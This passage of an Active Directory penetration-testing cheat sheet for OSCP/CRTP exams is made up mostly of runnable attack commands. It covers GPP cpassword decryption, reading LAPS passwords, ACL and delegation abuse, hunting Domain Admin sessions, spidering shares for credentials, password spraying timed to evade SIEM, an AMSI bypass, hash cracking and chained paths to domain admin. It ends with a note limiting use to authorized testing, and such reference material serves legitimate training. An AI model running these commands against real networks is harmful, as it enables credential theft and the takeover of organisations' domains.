key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
ciphertext = base64.b64decode('YOUR_CPASSWORD_HERE' + '==')
cipher = AES.new(key, AES.MODE_CBC, iv=ciphertext[:16])
print(cipher.decrypt(ciphertext[16:]).rstrip(b'\x0b').decode())
"

# === AUTOMATED TOOLS ===

# PowerView
Get-GPPPassword

# CME module
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M gpp_password

# Metasploit
use post/windows/gather/credentials/gpp

# Impacket
Get-GPPPassword.py domain/john.doe:Password123 -dc-ip 10.10.10.5
```

> 📌 Look in: `SYSVOL\domain\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml`

---

## 16. LAPS Enumeration

> **Use:** If LAPS is deployed, local admin passwords are stored in AD — if you can read them, free local admin.

```bash
# === DETECT LAPS ===

# Check if LAPS is installed (computer has ms-mcs-admpwd attribute)
Get-ADComputer -Filter * -Properties ms-mcs-admpwd |
  Where-Object {$_.'ms-mcs-admpwd' -ne $null} |
  Select Name,'ms-mcs-admpwd'

# PowerView
Get-DomainComputer -Properties ms-mcs-admpwd,name |
  Where-Object {$_.'ms-mcs-admpwd' -ne $null}

# Find who can READ LAPS passwords
Find-LAPSDelegatedGroups     # PowerView
Get-LAPSPermissions.ps1

# LDAP
ldapsearch -x -H ldap://10.10.10.5 \
  -D "john@domain.com" -w 'Pass' \
  -b "DC=domain,DC=com" \
  "(objectClass=computer)" cn ms-mcs-admpwd

# === READ LAPS (if you have permission) ===

# CrackMapExec
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' -M laps
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' -M laps -o TARGET=PC-01

# PowerView
Get-DomainComputer PC-01 -Properties ms-mcs-admpwd |
  Select -ExpandProperty ms-mcs-admpwd

# AD Cmdlet
Get-ADComputer PC-01 -Properties ms-mcs-admpwd | 
  Select ms-mcs-admpwd

# Python (Linux)
LAPSToolkit.py -f -t PC-01 -u john -p 'Pass' -d domain.com

# Impacket
GetLAPSPassword.py domain/john:Pass@10.10.10.5
```

---

## 17. ACL Enumeration

> **Use:** Find misconfigured permissions — GenericAll, WriteDACL, AddMember, etc. = privilege escalation paths.

```bash
# === POWERVIEW ===

# Specific user's ACLs on all objects
Get-ObjectAcl -SamAccountName john.doe -ResolveGUIDs

# ACLs on Domain Admins group
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find all interesting ACLs (where non-admins have write access)
Find-InterestingDomainAcl -ResolveGUIDs

# Filter for specific user's permissions
Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object {$_.IdentityReferenceName -match "john.doe"}

# Filter for specific rights
Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "GenericAll"}

Find-InterestingDomainAcl -ResolveGUIDs |
  Where-Object {$_.ActiveDirectoryRights -match "WriteDACL|WriteOwner|GenericAll|GenericWrite"}

# AD Cmdlet — ACL on specific object
(Get-Acl "AD:\CN=john.doe,CN=Users,DC=domain,DC=com").Access

# BloodHound — auto finds all ACL edges:
# GenericAll, GenericWrite, WriteDACL, WriteOwner,
# ForceChangePassword, AddMember, AddSelf, etc.
```

### ACL Rights → Attack Reference

| Right | Attack Action |
|-------|--------------|
| `GenericAll` | Reset password, add to group, add SPN |
| `GenericWrite` | Modify properties → add SPN → Kerberoast |
| `WriteDACL` | Add any permission to yourself |
| `WriteOwner` | Take ownership → then GenericAll |
| `ForceChangePassword` | Reset password without knowing old |
| `AddMember` | Add yourself/anyone to group |
| `AllExtendedRights` | Password operations (force change) |
| `Self` | Add self to group membership |
| `ReadLAPSPassword` | Read local admin LAPS password |
| `DCSync` | Dump all domain hashes |
| `Owns` | Object owner = full control |

---

## 18. Delegation Enumeration

> **Use:** Find machines/users with delegation configured — leads to powerful attacks (TGT capture, S4U2Proxy).

```bash
# === UNCONSTRAINED DELEGATION ===
# Any service this machine authenticates = TGT stored in memory!

# PowerView
Get-NetComputer -Unconstrained | Select name,dnshostname
Get-NetUser -Unconstrained | Select samaccountname

# AD Cmdlet
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
Get-ADUser -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation

# CrackMapExec
crackmapexec ldap 10.10.10.5 -u john -p 'Pass' --trusted-for-delegation

# LDAP
ldapsearch -x -H ldap://10.10.10.5 -D "john@domain.com" -w 'Pass' \
  -b "DC=domain,DC=com" \
  "(userAccountControl:1.2.840.113556.1.4.803:=524288)" cn

# BloodHound Cypher
MATCH (c {unconstraineddelegation:true}) RETURN c.name

# === CONSTRAINED DELEGATION ===
# Can impersonate users for specific services only

# PowerView
Get-NetUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
Get-NetComputer -TrustedToAuth | Select name,msds-allowedtodelegateto

# AD Cmdlet
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} \
  -Properties msDS-AllowedToDelegateTo | Select Name,msDS-AllowedToDelegateTo

Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} \
  -Properties msDS-AllowedToDelegateTo | Select Name,msDS-AllowedToDelegateTo

# BloodHound Cypher
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u.name, c.name

# === RESOURCE-BASED CONSTRAINED DELEGATION (RBCD) ===
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object {$_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null} |
  Select Name,'msDS-AllowedToActOnBehalfOfOtherIdentity'

# BloodHound edge: AllowedToAct
```

---

## 19. Trust Enumeration

> **Use:** Map domain trust relationships — find cross-domain pivot paths.

```bash
# === POWERVIEW ===
Get-NetDomainTrust
Get-NetDomainTrust -Domain other.domain.com
Get-NetForestTrust
Get-NetForestDomain | Get-NetDomainTrust

# === AD CMDLET ===
Get-ADTrust -Filter * -Server DC_IP
Get-ADTrust -Filter * -Server DC_IP | Select Name,TrustDirection,TrustType
Get-ADForest | Select Domains,Sites,GlobalCatalogs

# === NLTEST (built-in Windows) ===
nltest /domain_trusts
nltest /trusted_domains
nltest /dclist:za.tryhackme.com

# === BloodHound ===
# Domains tab → Trust edges visible
# Cypher:
MATCH p=(d:Domain)-[:TrustedBy]->(d2:Domain) RETURN p

# === MANUAL CHECK ===
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

### Trust Quick Reference

| Type | Direction | Meaning |
|------|-----------|---------|
| Parent-Child | Bidirectional | Auto-created, transitive |
| Forest | Bidirectional | Cross-forest access |
| External | One/Two-way | Specific domain trust |
| Shortcut | Bidirectional | Within forest, speed |
| Realm | One/Two-way | Non-Windows Kerberos |

---

## 20. Session Hunting

> **Use:** Find where privileged users (DA, EA) are currently logged in → go there → steal credentials.

```bash
# === POWERVIEW ===

# Active sessions on specific machine
Get-NetSession -ComputerName DC-01
Get-NetLoggedon -ComputerName PC-01

# WHERE IS THE DOMAIN ADMIN? (Most important query!)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"
Find-DomainUserLocation -UserName "t0_admin.user"

# All machines with sessions (slow — hits every machine!)
Find-DomainUserLocation

# === CME ===
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --loggedon-users
crackmapexec smb 10.10.10.0/24 -u john -p 'Pass' --loggedon-users

# === BLOODHOUND ===
# Pre-built query: "Find Computers where Domain Admins have Sessions"
# Shows exactly which machine the DA is on right now!

# Cypher — find DA sessions
MATCH (u:User)-[:HasSession]->(c:Computer)
WHERE u.admincount = true
RETURN u.name, c.name

# === NATIVE WINDOWS ===
qwinsta /server:PC-01                  # RDP sessions
query session /server:PC-01            # All sessions
net session \\PC-01                    # SMB sessions (if admin)
```

---

## 21. Share Enumeration

> **Use:** Find accessible shares — credentials, config files, sensitive data.

```bash
# === LINUX ===
smbclient -L //10.10.10.5 -U "john%Pass"
smbmap -H 10.10.10.5 -u john -p 'Pass'
smbmap -H 10.10.10.5 -u john -p 'Pass' -R              # Recursive
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --shares

# Spider all shares for interesting files
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M spider_plus
crackmapexec smb 10.10.10.5 -u john -p 'Pass' -M spider_plus \
  -o EXCLUDE_DIR=IPC$

# === WINDOWS / POWERVIEW ===
Invoke-ShareFinder -CheckShareAccess               # Only accessible shares
Invoke-ShareFinder -ExcludeStandard                # No ADMIN$/C$/IPC$
Invoke-FileFinder                                   # Interesting file extensions
Invoke-FileFinder -ShareList \\DC\shares.txt

# Net command
net view \\10.10.10.5
net view /domain

# === INSIDE SHARE — THINGS TO LOOK FOR ===
# *.xml, *.bat, *.ps1, *.vbs  → Scripts with creds
# *.config                     → App config with passwords
# *.kdbx                       → KeePass database
# web.config                   → DB connection strings
# applicationHost.config       → IIS app passwords
# unattend.xml                 → Sysprep passwords
# *.rdp, *.vpn                 → Saved connections

# Hunt for keywords
find /mnt/share -type f \( -name "*.txt" -o -name "*.xml" -o -name "*.bat" \) \
  -exec grep -il "password\|passwd\|cred\|secret" {} \;
```

---

## 22. Local Admin Mapping

> **Use:** Find which machines your current user has local admin on — pivot targets!

```bash
# === POWERVIEW ===
Find-LocalAdminAccess                              # Every machine you're local admin on
Find-LocalAdminAccess -ComputerName PC-01          # Specific machine check
Get-NetLocalGroup -ComputerName PC-01              # All local groups
Get-NetLocalGroupMember -ComputerName PC-01 -GroupName Administrators

# === CME (most reliable) ===
crackmapexec smb 10.10.10.0/24 -u john -p 'Pass'
# Any host showing (Pwn3d!) = you have local admin!

crackmapexec smb 10.10.10.0/24 -u john -p 'Pass' \
  --local-groups Administrators

# Hash spray for local admin
crackmapexec smb 10.10.10.0/24 -u Administrator \
  -H 'NTLM_HASH' --local-auth

# === BLOODHOUND ===
# Edges: AdminTo, CanRDP, CanPSRemote, ExecuteDCOM
# Pre-built: "Find Computers where Domain Users are Local Admins"
MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name
```

---

## 23. Password Spraying

> **Use:** One password against many users — avoids lockout, finds valid credentials.

```bash
# ⚠️ ALWAYS CHECK LOCKOUT POLICY FIRST!
net accounts /domain
crackmapexec smb 10.10.10.5 -u john -p 'Pass' --pass-pol
# Safe rule: spray (lockout_threshold - 1) times max

# === KERBRUTE (stealthiest) ===
kerbrute passwordspray --dc 10.10.10.5 -d domain.com \
  valid_users.txt 'Password123!' --safe

# === CME (smb) ===
crackmapexec smb 10.10.10.5 -u users.txt -p 'Password123' \
  --continue-on-success

# Multiple passwords (1:1 mapping, not bruteforce)
crackmapexec smb 10.10.10.5 -u users.txt -p passwords.txt \
  --no-bruteforce --continue-on-success

# === CME (ldap) ===
crackmapexec ldap 10.10.10.5 -u users.txt -p 'Password123' \
  --continue-on-success

# === Spray-AD (PowerShell, Windows) ===
Spray-AD -Domain "za.tryhackme.com" -UserList users.txt \
  -Password "Password123" -Delay 30

# === DomainPasswordSpray (PowerShell) ===
Invoke-DomainPasswordSpray -UserList users.txt \
  -Password 'Password123' -OutFile spray_results.txt

# === Common Passwords to Try ===
# Season+Year:  Spring2024!, Summer2024!, Autumn2024!, Winter2024!
# Company name: CompanyName1!, Company@123
# Welcome:      Welcome1, Welcome@1, Welcome2024!
# Generic:      Password1, P@ssword1, Password123!
# Month+Year:   January2024!, March2024!

# === Delay between sprays (avoid SIEM) ===
crackmapexec smb 10.10.10.5 -u users.txt -p 'Pass1' --continue-on-success
sleep 1800   # Wait 30 min (observation window) before next round
crackmapexec smb 10.10.10.5 -u users.txt -p 'Pass2' --continue-on-success
```

---

## 24. Living Off the Land (LOL)

> **Use:** No external tools — use Windows built-ins only. Avoid AV/EDR detection.

```cmd
# === USER/GROUP INFO ===
whoami /all                                    # Current user + groups + privileges
whoami /groups                                 # Groups only
whoami /priv                                   # Privileges (SeDebugPrivilege?)
net user /domain
net group /domain
net group "Domain Admins" /domain
net accounts /domain
nltest /domain_trusts
nltest /dclist:domain.com

# === MACHINE INFO ===
systeminfo                                     # OS, domain, DC, patches
hostname
ipconfig /all                                  # DNS server = likely DC IP!
route print
arp -a

# === DSQUERY (built-in LDAP query tool) ===
dsquery user -limit 0                          # All users
dsquery group -limit 0                         # All groups
dsquery computer -limit 0                      # All computers
dsquery ou -limit 0                            # All OUs
dsquery server -limit 0                        # All DCs
dsquery * -filter "(adminCount=1)" -limit 0    # Privileged accounts
dsquery * -filter "(&(objectClass=user)(servicePrincipalName=*))" -limit 0  # SPNs

# === SETSPN (SPN enum — no tools!) ===
setspn -T domain.com -Q */*

# === WMIC ===
wmic useraccount get name,sid,disabled         # Local users
wmic group get name                            # Local groups
wmic /namespace:\\root\directory\ldap path ds_user get ds-samaccountname
wmic computersystem get domain

# === POWERSHELL (built-in, no RSAT) ===
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
([ADSI]"LDAP://DC=domain,DC=com").Children | select distinguishedName
([ADSI]"WinNT://domain/john.doe,user").description

# LDAP search via .NET
$searcher = New-Object System.DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll()

# Find DC
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# === REG (LAPS check) ===
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
```

---

## 25. enum4linux / enum4linux-ng

> **Use:** One-stop Windows/AD enum from Linux — RPC + SMB + LDAP combined.

```bash
# === INSTALL ===
sudo apt install enum4linux
git clone https://github.com/cddmp/enum4linux-ng && cd enum4linux-ng
pip3 install -r requirements.txt

# === ENUM4LINUX ===
# Full unauthenticated
enum4linux -a 10.10.10.5

# Authenticated
enum4linux -u john.doe -p 'Password123' -a 10.10.10.5

# Specific flags
enum4linux -U 10.10.10.5       # Users
enum4linux -G 10.10.10.5       # Groups
enum4linux -S 10.10.10.5       # Shares
enum4linux -P 10.10.10.5       # Password policy
enum4linux -o 10.10.10.5       # OS info
enum4linux -n 10.10.10.5       # NetBIOS info
enum4linux -l 10.10.10.5       # LDAP info
enum4linux -d 10.10.10.5       # Detailed (descriptions!)
enum4linux -r 10.10.10.5       # RID cycling users

# Output to file
enum4linux -a 10.10.10.5 | tee enum4linux_output.txt

# === ENUM4LINUX-NG (newer, Python rewrite) ===
python3 enum4linux-ng.py 10.10.10.5 -A             # All, unauthenticated
python3 enum4linux-ng.py 10.10.10.5 -u john.doe -p 'Password123' -A
python3 enum4linux-ng.py 10.10.10.5 -A -oJ output  # JSON output
python3 enum4linux-ng.py 10.10.10.5 -A -oY output  # YAML output
```

---

## 26. WinRM Enumeration

> **Use:** If WinRM open (5985/5986) and creds valid → remote PowerShell shell.

```bash
# === CHECK ACCESS ===
crackmapexec winrm 10.10.10.5 -u john -p 'Pass'
# (Pwn3d!) = WinRM shell possible

crackmapexec winrm 10.10.10.0/24 -u john -p 'Pass'

# Nmap check
nmap -p 5985,5986 10.10.10.5

# === EVIL-WINRM ===
evil-winrm -i 10.10.10.5 -u john.doe -p 'Password123'
evil-winrm -i 10.10.10.5 -u john.doe -H 'NTLM_HASH'       # PTH
evil-winrm -i 10.10.10.5 -u john.doe -p 'Pass' -S         # HTTPS (5986)
evil-winrm -i 10.10.10.5 -u john.doe -p 'Pass' \
  -s /opt/scripts/ -e /opt/exes/                           # Load scripts

# Inside evil-winrm
*Evil-WinRM* PS> menu                    # Available commands
*Evil-WinRM* PS> Bypass-4MSI            # AMSI bypass
*Evil-WinRM* PS> upload SharpHound.exe  # Upload file
*Evil-WinRM* PS> download output.zip    # Download file
*Evil-WinRM* PS> Invoke-Binary SharpHound.exe  # Run binary from memory

# === NATIVE POWERSHELL ===
$sess = New-PSSession -ComputerName PC-01 -Credential (Get-Credential)
Enter-PSSession $sess
Invoke-Command -ComputerName PC-01 -Credential $cred -ScriptBlock {whoami}
```

---

## 27. Hash Cracking Reference

```bash
# === HASHCAT MODES ===
hashcat -m 1000   hash.txt wordlist.txt    # NTLM
hashcat -m 5600   hash.txt wordlist.txt    # NTLMv2 (Net-NTLMv2)
hashcat -m 13100  hash.txt wordlist.txt    # Kerberoast (TGS-REP)
hashcat -m 18200  hash.txt wordlist.txt    # AS-REP Roast
hashcat -m 19600  hash.txt wordlist.txt    # Kerberoast AES-128
hashcat -m 19700  hash.txt wordlist.txt    # Kerberoast AES-256
hashcat -m 3000   hash.txt wordlist.txt    # LM
hashcat -m 7500   hash.txt wordlist.txt    # Kerberos 5 AS-REQ Pre-Auth (etype 23)

# With rules
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/d3ad0ne.rule

# Show cracked
hashcat -m 1000 hash.txt --show
hashcat -m 13100 hash.txt --show

# === JOHN ===
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --rules
john hash.txt --show

# Format specify
john --format=krb5tgs hash.txt --wordlist=rockyou.txt  # Kerberoast
john --format=krb5asrep hash.txt --wordlist=rockyou.txt # AS-REP

# === HASH IDENTIFICATION ===
hashid 'HASH_HERE'
hash-identifier

# === COMMON WORDLISTS ===
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
```

### Hash Format Identification

| Hash Type | Starts With | Mode |
|-----------|-------------|------|
| NTLM | `aad3b435...` (32 chars) | 1000 |
| NTLMv2 | `user::domain:...` | 5600 |
| Kerberoast | `$krb5tgs$23$*` | 13100 |
| AS-REP | `$krb5asrep$23$` | 18200 |
| Kerberoast AES | `$krb5tgs$18$` | 19700 |

---

## 28. Important Ports Reference

| Port | Protocol | Service | AD Use |
|------|----------|---------|--------|
| 53 | TCP/UDP | DNS | Zone transfer, SRV records, DC discovery |
| 88 | TCP/UDP | Kerberos | Auth, AS-REP roast, Kerberoast, golden ticket |
| 135 | TCP | RPC | Remote enumeration, RPC-based attacks |
| 139 | TCP | NetBIOS | Legacy SMB, null sessions |
| 389 | TCP/UDP | LDAP | AD object queries, user/group enum |
| 443 | TCP | HTTPS | LDAPS, web apps with Windows auth |
| 445 | TCP | SMB | Shares, auth, relay, lateral movement |
| 464 | TCP/UDP | Kpasswd | Kerberos password change |
| 636 | TCP | LDAPS | Secure LDAP |
| 3268 | TCP | Global Catalog | Forest-wide LDAP queries |
| 3269 | TCP | GC SSL | Secure Global Catalog |
| 3389 | TCP | RDP | Remote Desktop |
| 5985 | TCP | WinRM HTTP | PowerShell remoting |
| 5986 | TCP | WinRM HTTPS | Secure PowerShell remoting |
| 9389 | TCP | ADWS | AD Web Services |

> 🎯 **DC Identifier:** Ports 88 + 389 + 445 all open = Domain Controller

---

## 29. OSCP Exam Quick Flow

```
╔══════════════════════════════════════════════════════════════╗
║                   OSCP AD ATTACK FLOW                        ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  STEP 1 — FIND DC                                            ║
║  nmap -p 88,389,445 10.10.10.0/24                            ║
║  crackmapexec smb 10.10.10.0/24                              ║
║                                                              ║
║  STEP 2 — PASSWORD POLICY (BEFORE ANYTHING ELSE!)            ║
║  net accounts /domain                                        ║
║  crackmapexec smb DC -u user -p pass --pass-pol              ║
║                                                              ║
║  STEP 3 — ENUMERATE USERS                                    ║
║  net user /domain                                            ║
║  kerbrute userenum --dc DC -d domain users.txt               ║
║                                                              ║
║  STEP 4 — PASSWORD SPRAY (within safe threshold)             ║
║  kerbrute passwordspray --dc DC -d domain users.txt 'Pass1'  ║
║                                                              ║
║  STEP 5 — BLOODHOUND (run in background immediately!)        ║
║  bloodhound-python -u user -p pass -d domain -c All          ║
║                                                              ║
║  STEP 6 — QUICK WINS                                         ║
║  GetNPUsers.py domain/ -usersfile users.txt    (AS-REP)      ║
║  GetUserSPNs.py domain/user:pass               (Kerberoast)  ║
║  crackmapexec smb DC -u user -p pass -M laps   (LAPS)        ║
║  Get-GPPPassword                               (GPP)         ║
║                                                              ║
║  STEP 7 — LOCAL ADMIN SWEEP                                  ║
║  crackmapexec smb 10.10.10.0/24 -u user -p pass              ║
║  Find (Pwn3d!) → go there → dump credentials                 ║
║                                                              ║
║  STEP 8 — BLOODHOUND ANALYSIS                                ║
║  Mark owned → Shortest path to DA → Follow edges             ║
║                                                              ║
║  STEP 9 — SESSION HUNTING (10AM & 2PM)                       ║
║  Find-DomainUserLocation -UserGroupIdentity "Domain Admins"  ║
║  SharpHound --CollectionMethods Session                      ║
║                                                              ║
║  STEP 10 — ACL / DELEGATION / TRUSTS                         ║
║  Find-InterestingDomainAcl -ResolveGUIDs                     ║
║  Get-NetComputer -Unconstrained                              ║
║  Get-NetDomainTrust                                          ║
╚══════════════════════════════════════════════════════════════╝
```

### Common OSCP Attack Chains

```
CHAIN 1: AS-REP Roast → Crack → Lateral Move → DA
  AS-REP hash → hashcat → plaintext → CME spray → (Pwn3d!) → dump → DA

CHAIN 2: Kerberoast → Crack → SVC Account → Privesc
  SPN account → TGS hash → hashcat → svc-sql:Pass → SA rights → DA

CHAIN 3: GPP Password → Local Admin → Credential Dump → DA
  SYSVOL cpassword → gpp-decrypt → local admin → secretsdump → DA hash

CHAIN 4: ACL Abuse → Password Reset → DA
  GenericAll on user → ForceChangePassword → new pass → if DA = game over

CHAIN 5: Unconstrained Delegation → Printer Bug → TGT → DCSync
  Find unconstrained machine → SpoolSample → capture DC TGT → DCSync

CHAIN 6: LAPS Read → Local Admin → Dump Creds → Lateral → DA
  Read ms-mcs-admpwd → local admin pass → secretsdump → reuse creds
```

---

## 30. Cypher Queries (BloodHound)

> Copy-paste into BloodHound Raw Query box.

```cypher
-- All Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}) 
RETURN u.name

-- Shortest path from owned to DA
MATCH (u:User {owned:true}),(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}) 
MATCH p=shortestPath((u)-[*1..]->(g)) 
RETURN p

-- All paths to DA
MATCH (u:User),(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}) 
MATCH p=shortestPath((u)-[*1..]->(g)) 
RETURN p

-- Kerberoastable accounts
MATCH (u:User {hasspn:true}) RETURN u.name, u.serviceprincipalnames

-- AS-REP Roastable
MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.enabled

-- Password never expires
MATCH (u:User {pwdneverexpires:true}) RETURN u.name, u.enabled

-- Unconstrained delegation
MATCH (c {unconstraineddelegation:true}) RETURN c.name, labels(c)

-- Constrained delegation
MATCH (u)-[:AllowedToDelegate]->(c) RETURN u.name, c.name

-- DA active sessions (where is DA logged in?)
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"})
MATCH (u)-[:HasSession]->(c:Computer) RETURN u.name, c.name

-- Find principals with DCSync rights
MATCH (u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain) RETURN u.name

-- Users with dangerous ACL rights on DA group
MATCH (u:User)-[r:GenericAll|WriteDACL|WriteOwner|AddMember|ForceChangePassword]
  ->(g:Group {name:"DOMAIN ADMINS@DOMAIN.COM"}) RETURN u.name, type(r)

-- LAPS readable computers
MATCH (u:User)-[:ReadLAPSPassword]->(c:Computer) RETURN u.name, c.name

-- Cross-domain attack paths
MATCH p=(d:Domain)-[:TrustedBy]->(d2:Domain) RETURN p

-- Computers where Domain Users are local admins (misconfiguration!)
MATCH (g:Group {name:"DOMAIN USERS@DOMAIN.COM"})-[:AdminTo]->(c:Computer) 
RETURN c.name

-- All AdminTo edges
MATCH (u)-[:AdminTo]->(c:Computer) RETURN u.name, c.name ORDER BY u.name

-- Find path between two specific nodes
MATCH (a {name:"JOHN.DOE@DOMAIN.COM"}),(b {name:"DOMAIN ADMINS@DOMAIN.COM"})
MATCH p=shortestPath((a)-[*1..]->(b)) RETURN p

-- Users that have never logged on
MATCH (u:User {enabled:true}) WHERE u.lastlogontimestamp=-1.0 
RETURN u.name

-- Computers with no LAPS
MATCH (c:Computer {enabled:true, haslaps:false}) RETURN c.name
```

---

## ⚡ ULTRA QUICK REFERENCE

```bash
# DC FIND
nmap -p 88,389,445 10.10.10.0/24 && crackmapexec smb 10.10.10.0/24

# PASS POLICY (ALWAYS FIRST!)
net accounts /domain

# USER LIST
net user /domain
kerbrute userenum --dc DC_IP -d DOMAIN users.txt

# SPRAY
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Pass'

# BLOODHOUND
bloodhound-python -u USER -p PASS -d DOMAIN -dc DC_IP -c All

# AS-REP
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat

# KERBEROAST
GetUserSPNs.py DOMAIN/USER:PASS -dc-ip DC_IP -outputfile kerb.txt

# CRACK
hashcat -m 18200 asrep.txt rockyou.txt      # AS-REP
hashcat -m 13100 kerb.txt rockyou.txt       # Kerberoast

# LOCAL ADMIN SWEEP
crackmapexec smb 10.10.10.0/24 -u USER -p PASS

# GPP
crackmapexec smb DC_IP -u USER -p PASS -M gpp_password

# LAPS
crackmapexec ldap DC_IP -u USER -p PASS -M laps

# SYSVOL
smbclient //DC_IP/SYSVOL -U "USER%PASS" && grep -ri "cpassword" .

# SESSION HUNT
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# WINRM
evil-winrm -i TARGET_IP -u USER -p PASS
```

---

*Generated for OSCP/CRTP/CTF quick reference — Every payload, every technique.*
*⚠️ For authorized penetration testing and educational use only.*
